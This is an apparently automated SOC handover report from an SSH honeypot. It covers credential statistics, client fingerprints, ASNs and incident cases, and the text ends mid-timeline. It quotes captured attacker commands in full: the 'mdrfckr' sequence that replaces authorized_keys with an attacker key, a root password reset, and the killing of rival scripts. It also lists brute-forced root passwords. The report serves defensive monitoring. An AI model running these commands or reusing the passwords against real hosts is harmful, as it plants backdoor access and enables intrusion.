# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-25 |
| **Generated At** | 2026-05-25T15:16:05Z |
| **Shift Time** | 15:16 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **242** |
| Confirmed Threats | **141** |
| False Positives Filtered | **101** (41.7%) |
| Unique Attacker IPs | **40** |
| Countries of Origin | **16** |
| High Severity Cases | **55** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **187** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **107** |
| Unique Credential Pairs | **50** |
| Unique Usernames | **23** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **38** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 55 |
| `345gs5662d34` | 25 |
| `cloud` | 4 |
| `curl` | 3 |
| `ubuntu` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 25 |
| `3245gs5662d34` | 25 |
| `fjbdfdjkdsfs541544AA@@` | 4 |
| `welltech12` | 3 |
| `fjbdfdjkdsfs541544@@` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 25 |
| `root` | `3245gs5662d34` | 25 |
| `root` | `fjbdfdjkdsfs541544AA@@` | 4 |
| `curl` | `welltech12` | 3 |
| `root` | `fjbdfdjkdsfs541544@@` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `12345678Ab` | `101.79.165.128` | 2026-05-25T10:16:11 |
| `root` | `3245gs5662d34` | `101.79.165.128` | 2026-05-25T10:16:14 |
| `root` | `a123456789.` | `186.248.159.82` | 2026-05-25T10:23:34 |
| `root` | `3245gs5662d34` | `186.248.159.82` | 2026-05-25T10:23:43 |
| `root` | `abcd@1234` | `186.248.159.82` | 2026-05-25T10:28:52 |
| `root` | `fjbdfdjkdsfs541544` | `186.248.159.82` | 2026-05-25T10:31:24 |
| `root` | `Aa112233.` | `186.248.159.82` | 2026-05-25T10:36:21 |
| `root` | `fjbdfdjkdsfs541544@@` | `186.248.159.82` | 2026-05-25T10:38:58 |
| `root` | `1221` | `186.248.159.82` | 2026-05-25T10:41:33 |
| `root` | `Password1` | `186.248.159.82` | 2026-05-25T10:44:15 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `186.248.159.82` | 2026-05-25T10:49:47 |
| `root` | `Abcd1234.` | `186.248.159.82` | 2026-05-25T10:52:31 |
| `root` | `abcd1234` | `186.248.159.82` | 2026-05-25T10:57:56 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `49.207.240.8` | 2026-05-25T12:29:56 |
| `root` | `3245gs5662d34` | `49.207.240.8` | 2026-05-25T12:29:58 |
| `root` | `123456789Aa` | `175.178.33.230` | 2026-05-25T12:41:43 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `14.103.117.141` | 2026-05-25T13:04:26 |
| `root` | `3245gs5662d34` | `14.103.117.141` | 2026-05-25T13:04:37 |
| `root` | `fjbdfdjkdsfs541544@@` | `197.140.18.248` | 2026-05-25T13:21:41 |
| `root` | `joshua` | `197.140.18.248` | 2026-05-25T13:29:43 |
| `root` | `P@$$w0rd2024` | `197.140.18.248` | 2026-05-25T13:41:47 |
| `root` | `3245gs5662d34` | `197.140.18.248` | 2026-05-25T13:41:50 |
| `root` | `cloud1234` | `197.140.18.248` | 2026-05-25T13:49:51 |
| `root` | `sr1234` | `197.248.8.33` | 2026-05-25T13:54:01 |
| `root` | `3245gs5662d34` | `197.248.8.33` | 2026-05-25T13:54:07 |
| `root` | `Csdx@13579` | `197.248.8.33` | 2026-05-25T13:55:59 |
| `root` | `admin123@@` | `197.248.8.33` | 2026-05-25T13:59:48 |
| `root` | `Pr@ject94` | `197.248.8.33` | 2026-05-25T14:07:01 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `197.248.8.33` | 2026-05-25T14:10:40 |
| `root` | `fjbdfdjkdsfs541544@@` | `197.248.8.33` | 2026-05-25T14:12:35 |
| `root` | `Black@123` | `197.248.8.33` | 2026-05-25T14:16:18 |
| `root` | `123ASDasd` | `197.248.8.33` | 2026-05-25T14:18:08 |
| `root` | `caca` | `152.32.130.144` | 2026-05-25T14:22:54 |
| `root` | `3245gs5662d34` | `152.32.130.144` | 2026-05-25T14:22:57 |
| `root` | `nYIPXnD2gx` | `47.103.26.37` | 2026-05-25T14:52:55 |
| `root` | `admin2026` | `103.82.21.8` | 2026-05-25T15:00:41 |
| `root` | `3245gs5662d34` | `103.82.21.8` | 2026-05-25T15:00:44 |
| `root` | `Test@123456` | `103.82.21.8` | 2026-05-25T15:05:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **242** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 113 |
| Go SSH scanner | 3 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 70 | 10 |
| `03a80b21afa8...` | Modern SSH client | 38 | 3 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 70 | 10 | Mirai/variant |
| `03a80b21afa8...` | libssh | 38 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 4 | — |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 25 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:wEJj4dXBF8H8"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `175.178.33.230`, `197.140.18.248`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `49.207.240.8`, `14.103.117.141`, `101.79.165.128`, `197.140.18.248`, `152.32.130.144`, `186.248.159.82`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **40** |
| Unique ASNs | **30** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS137120` | Nas Internet Services Private Limited | 1 | LOW |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | MEDIUM |
| `AS396982` | Google LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (55)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-cf21f4f3fd0a

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]128` |
| **First Seen** | 2026-05-25 10:16 |
| **Last Seen** | 2026-05-25 10:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:16:10` | `cowrie.session.connect` |
| `2026-05-25 10:16:10` | `cowrie.client.version` |
| `2026-05-25 10:16:10` | `cowrie.client.kex` |
| `2026-05-25 10:16:11` | `cowrie.login.success` |
| `2026-05-25 10:16:11` | `cowrie.session.params` |
| `2026-05-25 10:16:11` | `cowrie.command.input` |
| `2026-05-25 10:16:11` | `cowrie.command.failed` |
| `2026-05-25 10:16:11` | `cowrie.log.closed` |
| `2026-05-25 10:16:11` | `cowrie.session.params` |
| `2026-05-25 10:16:11` | `cowrie.command.input` |
| `2026-05-25 10:16:11` | `cowrie.session.file_download` |
| `2026-05-25 10:16:11` | `cowrie.log.closed` |
| `2026-05-25 10:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eb2ee4cc3b7

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]128` |
| **First Seen** | 2026-05-25 10:16 |
| **Last Seen** | 2026-05-25 10:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:16:13` | `cowrie.session.connect` |
| `2026-05-25 10:16:13` | `cowrie.client.version` |
| `2026-05-25 10:16:13` | `cowrie.client.kex` |
| `2026-05-25 10:16:14` | `cowrie.login.success` |
| `2026-05-25 10:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce22f7e15b2b

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:23 |
| **Last Seen** | 2026-05-25 10:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:23:33` | `cowrie.session.connect` |
| `2026-05-25 10:23:33` | `cowrie.client.version` |
| `2026-05-25 10:23:33` | `cowrie.client.kex` |
| `2026-05-25 10:23:34` | `cowrie.login.success` |
| `2026-05-25 10:23:35` | `cowrie.session.params` |
| `2026-05-25 10:23:35` | `cowrie.command.input` |
| `2026-05-25 10:23:35` | `cowrie.command.failed` |
| `2026-05-25 10:23:36` | `cowrie.log.closed` |
| `2026-05-25 10:23:36` | `cowrie.session.params` |
| `2026-05-25 10:23:36` | `cowrie.command.input` |
| `2026-05-25 10:23:37` | `cowrie.session.file_download` |
| `2026-05-25 10:23:37` | `cowrie.log.closed` |
| `2026-05-25 10:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62b7176ae88

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:23 |
| **Last Seen** | 2026-05-25 10:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:23:41` | `cowrie.session.connect` |
| `2026-05-25 10:23:41` | `cowrie.client.version` |
| `2026-05-25 10:23:41` | `cowrie.client.kex` |
| `2026-05-25 10:23:43` | `cowrie.login.success` |
| `2026-05-25 10:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71ac5e2253b4

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:28 |
| **Last Seen** | 2026-05-25 10:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:28:50` | `cowrie.session.connect` |
| `2026-05-25 10:28:50` | `cowrie.client.version` |
| `2026-05-25 10:28:50` | `cowrie.client.kex` |
| `2026-05-25 10:28:52` | `cowrie.login.success` |
| `2026-05-25 10:28:53` | `cowrie.session.params` |
| `2026-05-25 10:28:53` | `cowrie.command.input` |
| `2026-05-25 10:28:53` | `cowrie.command.failed` |
| `2026-05-25 10:28:54` | `cowrie.log.closed` |
| `2026-05-25 10:28:54` | `cowrie.session.params` |
| `2026-05-25 10:28:54` | `cowrie.command.input` |
| `2026-05-25 10:28:54` | `cowrie.session.file_download` |
| `2026-05-25 10:28:54` | `cowrie.log.closed` |
| `2026-05-25 10:29:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-936e22a5bde1

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:28 |
| **Last Seen** | 2026-05-25 10:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:28:59` | `cowrie.session.connect` |
| `2026-05-25 10:28:59` | `cowrie.client.version` |
| `2026-05-25 10:28:59` | `cowrie.client.kex` |
| `2026-05-25 10:29:00` | `cowrie.login.success` |
| `2026-05-25 10:29:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c82cda9074c

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:31 |
| **Last Seen** | 2026-05-25 10:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:31:23` | `cowrie.session.connect` |
| `2026-05-25 10:31:23` | `cowrie.client.version` |
| `2026-05-25 10:31:23` | `cowrie.client.kex` |
| `2026-05-25 10:31:24` | `cowrie.login.success` |
| `2026-05-25 10:31:25` | `cowrie.session.params` |
| `2026-05-25 10:31:25` | `cowrie.command.input` |
| `2026-05-25 10:31:25` | `cowrie.command.failed` |
| `2026-05-25 10:31:26` | `cowrie.log.closed` |
| `2026-05-25 10:31:26` | `cowrie.session.params` |
| `2026-05-25 10:31:26` | `cowrie.command.input` |
| `2026-05-25 10:31:27` | `cowrie.session.file_download` |
| `2026-05-25 10:31:27` | `cowrie.log.closed` |
| `2026-05-25 10:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f67c25de169

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:31 |
| **Last Seen** | 2026-05-25 10:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:31:31` | `cowrie.session.connect` |
| `2026-05-25 10:31:31` | `cowrie.client.version` |
| `2026-05-25 10:31:31` | `cowrie.client.kex` |
| `2026-05-25 10:31:33` | `cowrie.login.success` |
| `2026-05-25 10:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01e6925a8aef

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:36 |
| **Last Seen** | 2026-05-25 10:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:36:20` | `cowrie.session.connect` |
| `2026-05-25 10:36:20` | `cowrie.client.version` |
| `2026-05-25 10:36:20` | `cowrie.client.kex` |
| `2026-05-25 10:36:21` | `cowrie.login.success` |
| `2026-05-25 10:36:22` | `cowrie.session.params` |
| `2026-05-25 10:36:22` | `cowrie.command.input` |
| `2026-05-25 10:36:22` | `cowrie.command.failed` |
| `2026-05-25 10:36:23` | `cowrie.log.closed` |
| `2026-05-25 10:36:23` | `cowrie.session.params` |
| `2026-05-25 10:36:23` | `cowrie.command.input` |
| `2026-05-25 10:36:24` | `cowrie.session.file_download` |
| `2026-05-25 10:36:24` | `cowrie.log.closed` |
| `2026-05-25 10:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-401a6d3ca8c9

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:36 |
| **Last Seen** | 2026-05-25 10:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:36:28` | `cowrie.session.connect` |
| `2026-05-25 10:36:28` | `cowrie.client.version` |
| `2026-05-25 10:36:28` | `cowrie.client.kex` |
| `2026-05-25 10:36:30` | `cowrie.login.success` |
| `2026-05-25 10:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.159[.]82` to AbuseIPDB if not already reported
- [ ] Block `186.248.159[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dd9be434398

| Field | Detail |
|---|---|
| **Source IP** | `186.248.159[.]82` |
| **First Seen** | 2026-05-25 10:38 |
| **Last Seen** | 2026-05-25 10:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 10:38:56` | `cowrie.session.connect` |
| `2026-05-25 10:38:56` | `cowrie.client.version` |
| `2026-05-25 10:38:56` | `cowrie.client.kex` |
| `2026-05-25 10:38:58` | `cowrie.login.success` |
| `2026-05-25 10:38:58` | `cowrie.session.params` |
